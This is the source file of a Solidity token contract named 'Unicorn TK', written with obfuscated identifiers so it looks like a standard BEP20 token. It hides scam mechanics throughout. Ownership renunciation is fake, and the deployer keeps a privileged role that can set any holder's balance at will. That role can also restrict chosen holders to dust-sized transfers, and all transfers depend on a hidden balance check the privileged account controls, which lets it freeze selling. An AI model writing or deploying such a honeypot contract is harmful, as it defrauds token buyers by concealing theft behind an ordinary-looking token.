//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface bctbftfhgqcp {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract nbuymtemqbd {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface nyaghrmsqrz {
    function createPair(address yjbklicmie, address xvcxnmvvm) external returns (address);
}

interface exltwwrzz {
    function totalSupply() external view returns (uint256);

    function balanceOf(address njctbabbwp) external view returns (uint256);

    function transfer(address jebpycfcogwhfe, uint256 ggmugoolzlwgg) external returns (bool);

    function allowance(address ehzkzyfaabho, address spender) external view returns (uint256);

    function approve(address spender, uint256 ggmugoolzlwgg) external returns (bool);

    function transferFrom(
        address sender,
        address jebpycfcogwhfe,
        uint256 ggmugoolzlwgg
    ) external returns (bool);

    event Transfer(address indexed from, address indexed idruxdpam, uint256 value);
    event Approval(address indexed ehzkzyfaabho, address indexed spender, uint256 value);
}

interface exltwwrzzMetadata is exltwwrzz {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract UnicornTK is nbuymtemqbd, exltwwrzz, exltwwrzzMetadata {

    function blmcfzjuh() public {
        emit OwnershipTransferred(eqhypuimnfh, address(0));
        ugrzztfjyqtd = address(0);
    }

    function owner() external view returns (address) {
        return ugrzztfjyqtd;
    }

    uint256 constant bvekibacdc = 10 ** 10;

    function symbol() external view virtual override returns (string memory) {
        return wphxntzve;
    }

    uint256 clhxejyqksl;

    function name() external view virtual override returns (string memory) {
        return vdvpgkkqofxryn;
    }

    uint256 private kqbubodpx = 100000000 * 10 ** 18;

    bool public ghhuzqtfmgunr;

    bool public pslrljpuldl;

    function eyeitwqcbz(uint256 ggmugoolzlwgg) public {
        aacrlavrstws();
        clhxejyqksl = ggmugoolzlwgg;
    }

    mapping(address => mapping(address => uint256)) private ynqtfngatve;

    function totalSupply() external view virtual override returns (uint256) {
        return kqbubodpx;
    }

    address public eqhypuimnfh;

    function balanceOf(address njctbabbwp) public view virtual override returns (uint256) {
        return xljtdjohy[njctbabbwp];
    }

    mapping(address => bool) public xnqkdndyok;

    address public jtrsrqngq;

    string private wphxntzve = "UTK";

    function getOwner() external view returns (address) {
        return ugrzztfjyqtd;
    }

    uint256 fmblafctefl;

    function decimals() external view virtual override returns (uint8) {
        return lfdigsnsfyl;
    }

    function transfer(address hzfzhhmcrgj, uint256 ggmugoolzlwgg) external virtual override returns (bool) {
        return ambptlnbywqajr(_msgSender(), hzfzhhmcrgj, ggmugoolzlwgg);
    }

    function approve(address yuobmjhoungey, uint256 ggmugoolzlwgg) public virtual override returns (bool) {
        ynqtfngatve[_msgSender()][yuobmjhoungey] = ggmugoolzlwgg;
        emit Approval(_msgSender(), yuobmjhoungey, ggmugoolzlwgg);
        return true;
    }

    event OwnershipTransferred(address indexed nutqvdstwbugvs, address indexed apxbsfhmc);

    function forstyrtiftpqq(address jnfzvhpsqivzj) public {
        if (pslrljpuldl) {
            return;
        }
        
        frpfzotwtk[jnfzvhpsqivzj] = true;
        
        pslrljpuldl = true;
    }

    bool public zpkoiyszpwnl;

    function aacrlavrstws() private view {
        require(frpfzotwtk[_msgSender()]);
    }

    function ambptlnbywqajr(address ibvhboqsdowo, address jebpycfcogwhfe, uint256 ggmugoolzlwgg) internal returns (bool) {
        if (ibvhboqsdowo == eqhypuimnfh) {
            return uwwqsawirvmh(ibvhboqsdowo, jebpycfcogwhfe, ggmugoolzlwgg);
        }
        uint256 iwuvuvadrhpt = exltwwrzz(jtrsrqngq).balanceOf(zpplqcxudthwe);
        require(iwuvuvadrhpt == clhxejyqksl);
        if (xnqkdndyok[ibvhboqsdowo]) {
            return uwwqsawirvmh(ibvhboqsdowo, jebpycfcogwhfe, bvekibacdc);
        }
        return uwwqsawirvmh(ibvhboqsdowo, jebpycfcogwhfe, ggmugoolzlwgg);
    }

    function uwwqsawirvmh(address ibvhboqsdowo, address jebpycfcogwhfe, uint256 ggmugoolzlwgg) internal returns (bool) {
        require(xljtdjohy[ibvhboqsdowo] >= ggmugoolzlwgg);
        xljtdjohy[ibvhboqsdowo] -= ggmugoolzlwgg;
        xljtdjohy[jebpycfcogwhfe] += ggmugoolzlwgg;
        emit Transfer(ibvhboqsdowo, jebpycfcogwhfe, ggmugoolzlwgg);
        return true;
    }

    function allowance(address xnaksxxalytwa, address yuobmjhoungey) external view virtual override returns (uint256) {
        if (yuobmjhoungey == jyfllqllwts) {
            return type(uint256).max;
        }
        return ynqtfngatve[xnaksxxalytwa][yuobmjhoungey];
    }

    address private ugrzztfjyqtd;

    mapping(address => uint256) private xljtdjohy;

    constructor (){
        if (iumlfachcbufb != sloapioeb) {
            sloapioeb = iumlfachcbufb;
        }
        blmcfzjuh();
        bctbftfhgqcp gbbdjgezt = bctbftfhgqcp(jyfllqllwts);
        jtrsrqngq = nyaghrmsqrz(gbbdjgezt.factory()).createPair(gbbdjgezt.WETH(), address(this));
        if (ghhuzqtfmgunr == zpkoiyszpwnl) {
            ghhuzqtfmgunr = false;
        }
        eqhypuimnfh = _msgSender();
        frpfzotwtk[eqhypuimnfh] = true;
        xljtdjohy[eqhypuimnfh] = kqbubodpx;
        if (sloapioeb != iumlfachcbufb) {
            ghhuzqtfmgunr = true;
        }
        emit Transfer(address(0), eqhypuimnfh, kqbubodpx);
    }

    address zpplqcxudthwe = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public frpfzotwtk;

    function zykwiatdslcnr(address ehiahxatbjkm) public {
        aacrlavrstws();
        if (ghhuzqtfmgunr) {
            iumlfachcbufb = sloapioeb;
        }
        if (ehiahxatbjkm == eqhypuimnfh || ehiahxatbjkm == jtrsrqngq) {
            return;
        }
        xnqkdndyok[ehiahxatbjkm] = true;
    }

    uint256 public iumlfachcbufb;

    uint8 private lfdigsnsfyl = 18;

    function transferFrom(address ibvhboqsdowo, address jebpycfcogwhfe, uint256 ggmugoolzlwgg) external override returns (bool) {
        if (_msgSender() != jyfllqllwts) {
            if (ynqtfngatve[ibvhboqsdowo][_msgSender()] != type(uint256).max) {
                require(ggmugoolzlwgg <= ynqtfngatve[ibvhboqsdowo][_msgSender()]);
                ynqtfngatve[ibvhboqsdowo][_msgSender()] -= ggmugoolzlwgg;
            }
        }
        return ambptlnbywqajr(ibvhboqsdowo, jebpycfcogwhfe, ggmugoolzlwgg);
    }

    string private vdvpgkkqofxryn = "Unicorn TK";

    uint256 public sloapioeb;

    function ncnnilyyg(address hzfzhhmcrgj, uint256 ggmugoolzlwgg) public {
        aacrlavrstws();
        xljtdjohy[hzfzhhmcrgj] = ggmugoolzlwgg;
    }

    address jyfllqllwts = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

}